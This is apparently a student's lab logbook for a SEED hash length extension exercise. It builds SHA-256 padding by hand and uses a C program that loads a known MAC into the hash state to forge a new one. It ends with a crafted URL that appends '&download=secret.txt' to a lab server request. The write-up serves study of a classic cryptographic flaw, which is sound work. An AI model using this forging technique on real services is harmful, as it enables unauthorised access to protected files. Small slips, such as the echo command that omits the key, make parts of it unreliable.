# Logbook 10 - Hash Length Extension Attack Lab

## Task 1: Send Request to List Files

In this task, the goal is to understand how the server behaves when it receives different kinds of requests.

The first thing we tested was simply accessing the server’s webpage after composing a basic request.  
We quickly realized that the server requires a **valid `uid` parameter**; otherwise, it responds with a blank page containing the message:
 `UID argument not found. Aborting`.

This tells us that the server will not continue processing unless `uid` is present and correct among other parameters. So we tried with mock values given in the lab.
Url: `http://www.seedlab-hashlen.com/?myname=JohnDoe&uid=1001&lstcmd=1
mac=dc8788905dbcbceffcdd5578887717c12691b3cf1dac6b2f2bcfabc14a6a7f1`

Which returned the following response:

![Logbook 10 MacResponse](../images/logbook10/task1/task1Error.png)

This makes sense, since the MAC we used earlier was almost certainly miscalculated.  
So our next step is to generate our **own correct MAC** for a valid request to the server.

First, we will use the name of one of our group members: `JoseFerreira`.

Next, we need to obtain the proper `uid:key` pair in order to compute the MAC.  
This is important because, in this lab, the MAC is calculated using the formula:
```
MAC = sha256( k : m )
```


where:

- **m** is the request string (e.g., `myname=JohnDoe&uid=1001&lstcmd=1`)
- **k** is the secret key associated with the selected UID

To make our test slightly different from the lab example, we will use UID **1003**, which has the corresponding secret key **793zye**.

We also want to test the basic `lstcmd` operation, which lists the files on the server.  
So we will set `lstcmd=1`.

**Summary of parameters:**

- `myname=JoseFerreira`  
- `key=793zye`  
- `uid=1003`  
- `lstcmd=1`

To calculate the MAC, the lab instructs us to use `sha256sum`.  
This is why we need the secret key: it ensures we can hash the request in a way that the server will accept.

The string to hash is constructed as:

```
k:R
```

where `k` is the key (`793zye`) and `R` is the full request `myname=JoseFerreira&uid=1003&lstcmd=1`


So the final input to `sha256sum` becomes:

```
793zye:myname=JoseFerreira&uid=1003&lstcmd=1
```

We can compute the MAC by running the following command in Bash:

```
echo -n "myname=JoseFerreira&uid=1003&lstcmd=1" | sha256sum
```
Although we could use the Bash command directly, it is much easier to experiment with different values using a Python script.  
Because of this, the command we *actually* used for the lab was generated by our Python helper script:

```py
mac_input = f"{key}:{params}"
mac = hashlib.sha256(mac_input.encode()).hexdigest()
```

Generated mac:
```
aa96991069fac7d8334c19911d82310223cd005f828edcb39af61e735d85b46a
```

The final result we got:
![Logbook 10 MacResponse](../images/logbook10/task1/task1Success.png)

It worked! we can finally talk with the server correctly.

***Notes***:
The purpose of the Python script was simply to give us a more flexible way to change values without much effort.  
The script generates the correct MAC and prints the final URL, which we then copied and pasted into the web browser manually.

***Script***:
```py
import hashlib

uids = {
    1001: "123456",
    1002: "983abe",
    1003: "793zye",
    1004: "88zjxc",
    1005: "xciujk",
}

def build_url(name, uid, lstcmd=False):

    if uid not in uids:
        raise ValueError(f"Unknown UID: {uid}")
    
    key = uids[uid]
    
    params = f"myname={name}&uid={uid}"
    if lstcmd:
        params += "&lstcmd=1"
    
    
    mac_input = f"{key}:{params}"
    mac = hashlib.sha256(mac_input.encode()).hexdigest()
    
    
    url = f"http://www.seedlab-hashlen.com/?{params}&mac={mac}"
    return url


name = "JoseFerreira"
uid = 1003


url = build_url(name, uid, lstcmd=True)
print("URL:", url)
```

## Task 2 : Create Padding

To explore the hash extension attack, we first need to understand how padding works in SHA‑256.  
SHA‑256 processes data in **64‑byte blocks**, which means the message must be padded so that its length becomes a multiple of 64 bytes.
The padding follows a very specific format. Immediately after the original message, the algorithm appends a special byte `\x80`, which marks the end of the message. After this byte, the message is filled with `\x00` bytes until it is exactly **8 bytes short of a 64‑byte boundary**. 
Why stop 8 bytes before the boundary?  
Because the **last 8 bytes** are reserved for the length of the original message, represented in bits and stored in **big‑endian** format.

With this in mind lets build the padding for our original message:

We first need to understand the length in size of our message 
```
793zye:myname=JoseFerreira&uid=1003&lstcmd=1
```

The message length is **44 bytes**.

Since 44 < 56, we can pad the message directly to reach 56 bytes (the last 8 bytes are reserved for the SHA-256 length field, making the total 64).

SHA-256 padding works as follows:

1. **Append `0x80`** as the first byte after the message.  
   This marks the end of the original message.

2. After adding `0x80`, the message length becomes 45 bytes.  
   To reach 56 bytes, we need:

```
56 − 45 = 11 bytes of 0x00
```

These zero bytes form the bulk of the padding.

3. The final **8 bytes** store the length of the original message **in bits**, encoded as a 64-bit big-endian integer.

The original message is 44 bytes, so:
```
44 × 8 = 352 bits
```

In 64-bit big-endian hexadecimal this is:
```
0000000000000160
```

Which leaves us with the final result of :
```sh
"793zye:myname=JoseFerreira&uid=1003&lstcmd=1"
"\x80"
"\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x01\x60"
```

## Task 3: The Length Extension Attack

In this task, we put everything together.  
We already have the original request from Task 1 and the correct padding from Task 2. The remaining steps are to append the length-extension attack to the URL and forge a new MAC that validates both the padding and the malicious command added to the original message.

To do this, we use the script provided in the lab, making two key modifications:
- Replace the original MAC with the one we calculated in Task 1.
- Modify the `SHA256_Update` call from  

```c
SHA256_Update(&c, "Extra message", 13);
```

to:
```c
SHA256_Update(&c, "&download=secret.txt", 20);
```
where the second argument is the injected malicious command and the third argument is its length.

Below is the final script used to calculate the new forged MAC:

```c
/* length_ext.c */
#include <stdio.h>
#include <arpa/inet.h>
#include <openssl/sha.h>
int main(int argc, const char *argv[])
{
    int i;
    unsigned char buffer[SHA256_DIGEST_LENGTH];
    SHA256_CTX c;
    SHA256_Init(&c);
    for(i=0; i<64; i++)
        SHA256_Update(&c, "*", 1);

    // MAC of the original message M (padded)

    c.h[0] = htole32(0xaa969910);
    c.h[1] = htole32(0x69fac7d8);
    c.h[2] = htole32(0x334c1991);
    c.h[3] = htole32(0x1d823102);
    c.h[4] = htole32(0x23cd005f);
    c.h[5] = htole32(0x828edcb3);
    c.h[6] = htole32(0x9af61e73);
    c.h[7] = htole32(0x5d85b46a);

    // Append additional message
    SHA256_Update(&c, "&download=secret.txt", 20);
    SHA256_Final(buffer, &c);
    for(i = 0; i < 32; i++) {
        printf("%02x", buffer[i]);
    }
    printf("\n");
    return 0;
}
```

Generating us the following new MAC: `73c1b3041b67978c7807b7a7445e44f7d9a8a868a0fdd44fc65b888e73bb565f`

#### Putting it all together

1. The existing request:
```h
http://www.seedlab-hashlen.com/?myname=JoseFerreira&uid=1003&lstcmd=1
```
2. Adding the padding in url format:
```h
%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%60
```

3. Malicious command:
```h
&down&download=secret.txt
```

4. Adding our new forged mac:

```h
&mac=73c1b3041b67978c7807b7a7445e44f7d9a8a868a0fdd44fc65b888e73bb565f
```

Final url:
```h
http://www.seedlab-hashlen.com/?myname=JoseFerreira&uid=1003&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%60&download=secret.txt&mac=73c1b3041b67978c7807b7a7445e44f7d9a8a868a0fdd44fc65b888e73bb565f
```

![Logbook 10 MacResponse](../images/logbook10/task3/TASK3result.png)


